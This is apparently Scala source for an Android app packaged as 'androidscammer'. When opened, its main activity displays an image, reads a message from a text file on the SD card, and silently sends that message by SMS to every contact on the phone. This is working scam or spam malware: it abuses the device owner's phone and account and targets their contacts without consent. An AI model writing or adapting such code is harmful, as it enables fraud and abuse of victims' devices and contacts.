package org.furidamu.androidscammer

import android.app.Activity
import android.os.Bundle
import android.os.Environment
import android.view.View
import android.provider.ContactsContract
import android.telephony.gsm.SmsManager
import android.graphics.BitmapFactory
import Constants._
import scala.collection.JavaConversions._
import java.io.BufferedReader
import java.io.FileReader
import java.io.File


class MainActivity extends Activity with TypedActivity {


  override def onCreate(bundle: Bundle) {
    super.onCreate(bundle)
    setContentView(R.layout.main)

    val img = findView(TR.imgview)

    val imgFile = new File("/sdcard/image.jpg")

    if(imgFile.exists()){

        val myBitmap = BitmapFactory.decodeFile(imgFile.getAbsolutePath());

        img.setImageBitmap(myBitmap);

    }

    // read message from SD card
    val dir = Environment.getExternalStorageDirectory()
    val file = new BufferedReader(new FileReader(dir + "/message.txt"))
    val msg = file.readLine()

    val reader = new ContactReader(this);

    val sm = SmsManager.getDefault();

    val contacts = reader.read() map { list => (list(0), list(1)) }

    contacts foreach { case (name, number) =>
			sm.sendTextMessage(number, null, msg, null, null);
    }


  }


}
